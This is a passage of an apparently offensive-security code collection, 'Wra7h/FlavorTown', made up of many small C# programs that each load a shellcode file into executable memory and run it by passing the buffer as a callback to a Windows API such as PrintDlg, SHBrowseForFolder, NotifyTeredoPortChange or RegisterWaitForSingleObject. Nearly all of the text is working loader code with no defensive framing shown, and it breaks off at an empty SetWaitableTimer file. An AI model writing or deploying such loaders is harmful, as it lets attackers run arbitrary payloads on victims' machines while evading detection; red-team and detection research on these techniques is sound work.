            NotifyRouteChange2(AF_INET, hAlloc, IntPtr.Zero, true, ref hNotification);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Iphlpapi.dll")]
        static extern IntPtr NotifyRouteChange2(
             uint AddressFamily,
             IntPtr Callback,
             IntPtr CallerContext,
             bool InitialNotification,
             ref IntPtr NotificationHandle);

    }
}

```

`C#/NotifyTeredoPortChange.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace NotifyTeredoPortChange
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: NotifyTeredoPortChange.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc,
                payload.Length, 0x20/*RX*/, out oldProtect);

            IntPtr hNotification = IntPtr.Zero;
            NotifyTeredoPortChange(hAlloc, IntPtr.Zero, true, ref hNotification);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Iphlpapi.dll")]
        static extern IntPtr NotifyTeredoPortChange(
             IntPtr Callback,
             IntPtr CallerContext,
             bool InitialNotification,
             ref IntPtr NotificationHandle);

    }
}

```

`C#/NotifyUnicastIpAddressChange.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace NotifyUnicastIpAddressChange
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: NotifyUnicastIpAddressChange.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            IntPtr hNotification = IntPtr.Zero;
            uint AF_INET = 2;
            NotifyUnicastIpAddressChange(AF_INET, hAlloc, IntPtr.Zero, true, ref hNotification);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Iphlpapi.dll")]
        static extern IntPtr NotifyUnicastIpAddressChange(
            uint Family,
            IntPtr Callback,
            IntPtr CallerContext,
            bool InitialNotification,
            ref IntPtr NotificationHandle);
    }
}

```

`C#/OleUIBusy.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace OleUIBusy
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: OleUIBusy.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            int CF_ENABLEHOOK = 0x8;

            OLEUIBUSY sOleUIBusy = new OLEUIBUSY();
            sOleUIBusy.cbStruct = (uint)Marshal.SizeOf(sOleUIBusy);
            sOleUIBusy.hWndOwner = Process.GetCurrentProcess().MainWindowHandle;
            sOleUIBusy.lpfnHook = hAlloc;

            OleUIBusy(ref sOleUIBusy);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("OleDlg.dll")]
        public extern static bool OleUIBusy(ref OLEUIBUSY unnamedParam1);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct OLEUIBUSY
        {
            public uint cbStruct;      
            public uint dwFlags;       
            public IntPtr hWndOwner;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpszCaption;
            public IntPtr lpfnHook;
            public IntPtr lCustData;     
            public IntPtr hInstance;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpszTemplate; 
            public IntPtr hResource;
            public IntPtr hTask;
            public IntPtr lphWndDialog;
        }
    }
}

```

`C#/PageSetupDlg.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PageSetupDlg
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: PageSetupDlg.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            int PSD_ENABLEPAGESETUPHOOK = 0x00002000;

            PAGESETUPDLG_STRUCT sPageSetupDlg = new PAGESETUPDLG_STRUCT();
            sPageSetupDlg.lStructSize = Marshal.SizeOf(sPageSetupDlg);
            sPageSetupDlg.Flags = PSD_ENABLEPAGESETUPHOOK;
            sPageSetupDlg.lpfnPageSetupHook = hAlloc;

            PageSetupDlg(sPageSetupDlg);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("comdlg32.dll")]
        static extern bool PageSetupDlg([In,Out] PAGESETUPDLG_STRUCT lppsd);

        [StructLayout(LayoutKind.Sequential, Size = 128)]
        struct PAGESETUPDLG_STRUCT
        {
            public int lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hDevMode;
            public IntPtr hDevNames;
            public int Flags;
            public POINT ptPaperSize;
            public RECT rtMinMargin;
            public RECT rtMargin;
            public IntPtr hInstance;
            public int lCustData;
            public IntPtr lpfnPageSetupHook;
            public IntPtr lpfnPagePaintHook;
            public IntPtr lpPageSetupTemplateName;
            public IntPtr hPageSetupTemplate;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;

            public POINT(int x, int y)
            {
                this.X = x;
                this.Y = y;
            }

            public static implicit operator System.Drawing.Point(POINT p)
            {
                return new System.Drawing.Point(p.X, p.Y);
            }

            public static implicit operator POINT(System.Drawing.Point p)
            {
                return new POINT(p.X, p.Y);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left, Top, Right, Bottom;

            public RECT(int left, int top, int right, int bottom)
            {
                Left = left;
                Top = top;
                Right = right;
                Bottom = bottom;
            }

            public RECT(System.Drawing.Rectangle r) : this(r.Left, r.Top, r.Right, r.Bottom) { }

            public int X
            {
                get { return Left; }
                set { Right -= (Left - value); Left = value; }
            }

            public int Y
            {
                get { return Top; }
                set { Bottom -= (Top - value); Top = value; }
            }

            public int Height
            {
                get { return Bottom - Top; }
                set { Bottom = value + Top; }
            }

            public int Width
            {
                get { return Right - Left; }
                set { Right = value + Left; }
            }

            public System.Drawing.Point Location
            {
                get { return new System.Drawing.Point(Left, Top); }
                set { X = value.X; Y = value.Y; }
            }

            public System.Drawing.Size Size
            {
                get { return new System.Drawing.Size(Width, Height); }
                set { Width = value.Width; Height = value.Height; }
            }

            public static implicit operator System.Drawing.Rectangle(RECT r)
            {
                return new System.Drawing.Rectangle(r.Left, r.Top, r.Width, r.Height);
            }

            public static implicit operator RECT(System.Drawing.Rectangle r)
            {
                return new RECT(r);
            }

            public static bool operator ==(RECT r1, RECT r2)
            {
                return r1.Equals(r2);
            }

            public static bool operator !=(RECT r1, RECT r2)
            {
                return !r1.Equals(r2);
            }

            public bool Equals(RECT r)
            {
                return r.Left == Left && r.Top == Top && r.Right == Right && r.Bottom == Bottom;
            }

            public override bool Equals(object obj)
            {
                if (obj is RECT)
                    return Equals((RECT)obj);
                else if (obj is System.Drawing.Rectangle)
                    return Equals(new RECT((System.Drawing.Rectangle)obj));
                return false;
            }

            public override int GetHashCode()
            {
                return ((System.Drawing.Rectangle)this).GetHashCode();
            }

            public override string ToString()
            {
                return string.Format(System.Globalization.CultureInfo.CurrentCulture, "{{Left={0},Top={1},Right={2},Bottom={3}}}", Left, Top, Right, Bottom);
            }
        }
    }
}

```

`C#/PdhBrowseCounters.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PdhBrowseCounters
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: PdhBrowseCounters.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);


            PDH_BROWSE_DLG_CONFIG sBDC = new PDH_BROWSE_DLG_CONFIG();
            sBDC.pCallBack = hAlloc;

            PdhBrowseCounters(ref sBDC);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Pdh.dll")]
        static extern bool PdhBrowseCounters(ref PDH_BROWSE_DLG_CONFIG pBrowseDlgData);

        //Modified struct from https://github.com/dahall/Vanara/blob/3e1596ba7f60f6478e9efd0d5c1b30d102df9439/PInvoke/Pdh/Pdh.cs
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
		public struct PDH_BROWSE_DLG_CONFIG
		{
			public BrowseFlag Flags;
			public IntPtr hWndOwner;
			[MarshalAs(UnmanagedType.LPTStr)] 
            public string szDataSource;
			public IntPtr szReturnPathBuffer;
			public uint cchReturnPathLength;
			public IntPtr pCallBack;
			public IntPtr dwCallBackArg;
			public uint CallBackStatus;
			public uint dwDefaultDetailLevel;

			[MarshalAs(UnmanagedType.LPTStr)] 
            public string szDialogBoxCaption;
			public IntPtr CounterPaths;
		}


        //https://github.com/dahall/Vanara/blob/3e1596ba7f60f6478e9efd0d5c1b30d102df9439/PInvoke/Pdh/Pdh.cs
        [Flags]
		public enum BrowseFlag
		{
			bIncludeInstanceIndex = 1 << 0,
			bSingleCounterPerAdd = 1 << 1,
			bSingleCounterPerDialog = 1 << 2,
			bLocalCountersOnly = 1 << 3,
			bWildCardInstances = 1 << 4,
			bHideDetailBox = 1 << 5,
			bInitializePath = 1 << 6,
			bDisableMachineSelection = 1 << 7,
			bIncludeCostlyObjects = 1 << 8,
			bShowObjectBrowser = 1 << 9,
		}
	}
}

```

`C#/PerfStartProviderEx.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PerfStartProviderEx
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: PerfStartProviderEx.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            Guid ProviderGuid = Guid.NewGuid();

            PERF_PROVIDER_CONTEXT sPPC = new PERF_PROVIDER_CONTEXT();
            sPPC.MemAllocRoutine = hAlloc;
            sPPC.ContextSize = (uint)Marshal.SizeOf(sPPC);

            IntPtr hProvider = IntPtr.Zero;
            PerfStartProviderEx(ref ProviderGuid, ref sPPC, out hProvider);

            //Close provider handle
            PerfStopProvider(hProvider);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("advapi32.dll")]
        static extern ulong PerfStartProviderEx(
             ref Guid ProviderGuid,
             ref PERF_PROVIDER_CONTEXT ProviderContext,
             out IntPtr hProvider);

        [DllImport("advapi32.dll")]
        static extern ulong PerfStopProvider(IntPtr hProvider);

        struct PERF_PROVIDER_CONTEXT
        {
            public uint ContextSize;
            public uint Reserved;
            public IntPtr ControlCallback;
            public IntPtr MemAllocRoutine;
            public IntPtr MemFreeRoutine;
            public IntPtr pMemContext;
        }

    }
}

```

`C#/PowerRegisterForEffectivePowerModeNotifications.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PowerRegisterForEffectivePowerModeNotifications
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: PowerRegisterForEffectivePowerModeNotifications.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            ulong EFFECTIVE_POWER_MODE_V2 = 0x2;
            IntPtr hRegister = IntPtr.Zero;
            PowerRegisterForEffectivePowerModeNotifications(EFFECTIVE_POWER_MODE_V2, hAlloc, IntPtr.Zero, ref hRegister);

            System.Threading.Thread.Sleep(-1);//INFINITE
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess, IntPtr lpAddress,
            int dwSize, uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Powrprof.dll")]
        static extern IntPtr PowerRegisterForEffectivePowerModeNotifications(ulong Version,
            IntPtr Callback, IntPtr Context, ref IntPtr RegistrationHandle);
    }
}
```

`C#/PrintDlg.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PrintDlg
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: PrintDlg.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            uint PD_ENABLEPRINTHOOK = 0x00001000;

            PRINTDLG sPrintDlg = new PRINTDLG();
            sPrintDlg.lStructSize = (uint)Marshal.SizeOf(sPrintDlg);
            sPrintDlg.Flags = PD_ENABLEPRINTHOOK;
            sPrintDlg.lpfnPrintHook = hAlloc;

            PrintDlg(sPrintDlg);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("comdlg32.dll")]
        static extern bool PrintDlg([In,Out] PRINTDLG lppd);

        [StructLayout(LayoutKind.Sequential)]
        public class PRINTDLG
        {
            public uint lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hDevMode;
            public IntPtr hDevNames;
            public IntPtr hDC;
            public uint Flags;
            public ushort nFromPage;
            public ushort nToPage;
            public ushort nMinPage;
            public ushort nMaxPage;
            public ushort nCopies;
            public IntPtr hInstance;
            public IntPtr lCustData;
            public IntPtr lpfnPrintHook;
            public IntPtr lpfnSetupHook;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpPrintTemplateName;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpSetupTemplateName;
            public IntPtr hPrintTemplate;
            public IntPtr hSetupTemplate;
        }
    }
}

```

`C#/RegisterWaitChainCOMCallback.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace RegisterWaitChainCOMCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: RegisterWaitChainCOMCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            RegisterWaitChainCOMCallback(hAlloc, IntPtr.Zero);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Advapi32.dll")]
        public extern static void RegisterWaitChainCOMCallback(IntPtr CallStateCallback, IntPtr ActivationStateCallback);
    }
}

```

`C#/RegisterWaitForSingleObject.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace RegisterWaitForSingleObject
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: RegisterWaitForSingleObject.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }
            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                IntPtr.Zero,
                (uint)payload.Length,
                0x1000 /*COMMIT*/,
                0x40 /*RWX*/);
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            IntPtr NewWaitObj = IntPtr.Zero;
            ulong WT_EXECUTEONLYONCE = 0x8;
            RegisterWaitForSingleObject(out NewWaitObj, Process.GetCurrentProcess().Handle, hAlloc, IntPtr.Zero, 0, WT_EXECUTEONLYONCE);
            Sleep(1000);
        }

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Kernel32.dll")]
        static extern IntPtr RegisterWaitForSingleObject(
            out IntPtr phNewWaitObject,
            IntPtr hObject,
            IntPtr Callback,
            IntPtr Context,
            ulong dwMilliseconds,
            ulong dwFlags);

        [DllImport("kernel32")]
        static extern void Sleep(int milliseconds);
    }
}

```

`C#/ReplaceText.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ReplaceText
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: ReplaceText.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);


            uint FR_ENABLEHOOK = 0x100;
            FINDREPLACE sFR = new FINDREPLACE();
            sFR.lStructSize = (uint)Marshal.SizeOf(sFR);
            sFR.hwndOwner = Process.GetCurrentProcess().MainWindowHandle;
            sFR.Flags = FR_ENABLEHOOK;
            sFR.lpfnHook = hAlloc;
            sFR.lpstrFindWhat = "h7arW";
            sFR.lpstrReplaceWith = "h7arW";
            sFR.wReplaceWithLen = 1;
            sFR.wFindWhatLen = 1;

            ReplaceText(ref sFR);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("comdlg32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr ReplaceText(ref FINDREPLACE lpfr);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct FINDREPLACE
        {
            public uint lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            public uint Flags;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpstrFindWhat;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpstrReplaceWith;
            public ushort wFindWhatLen;
            public ushort wReplaceWithLen;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public IntPtr lpTemplateName;
        }
    }
}

```

`C#/SHBrowseForFolder.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SHBrowseForFolder
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: SHBrowseForFolder.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            BROWSEINFO sBI = new BROWSEINFO();
            sBI.hwndOwner = IntPtr.Zero;
            sBI.pidlRoot = IntPtr.Zero;
            sBI.pszDisplayName = IntPtr.Zero;
            sBI.lpszTitle = "h7arW";
            sBI.ulFlags = 0;
            sBI.lpfn = hAlloc;

            SHBrowseForFolder(ref sBI);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("shell32.dll")]
        static extern IntPtr SHBrowseForFolder(ref BROWSEINFO lpbi);

        [StructLayout(LayoutKind.Sequential)]
        struct BROWSEINFO
        {
            public IntPtr hwndOwner;
            public IntPtr pidlRoot;
            public IntPtr pszDisplayName;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpszTitle;
            public uint ulFlags;
            public IntPtr lpfn;
            public IntPtr lParam;
            public int iImage;
        }
    }
}

```

`C#/SHCreateThreadWithHandle.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SHCreateThreadWithHandle
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: SHCreateThreadWithHandle.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length,
                0x20/*RX*/, out oldProtect);

            IntPtr hThread = IntPtr.Zero;
            SHCreateThreadWithHandle(hAlloc, IntPtr.Zero, 0, IntPtr.Zero, ref hThread);

            uint INFINITE = 0xFFFFFFFF;
            WaitForSingleObject(hThread, INFINITE);

            //Cleanup
            CloseHandle(hThread);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Shlwapi.dll")]
        static extern bool SHCreateThreadWithHandle(
           IntPtr pfnThreadProc,
           IntPtr pData,
           uint flags,
           IntPtr pfnCallback,
           ref IntPtr hThread);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr Handle, uint Wait);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);
    }
}

```

`C#/SetWaitableTimer.cs`:

```cs
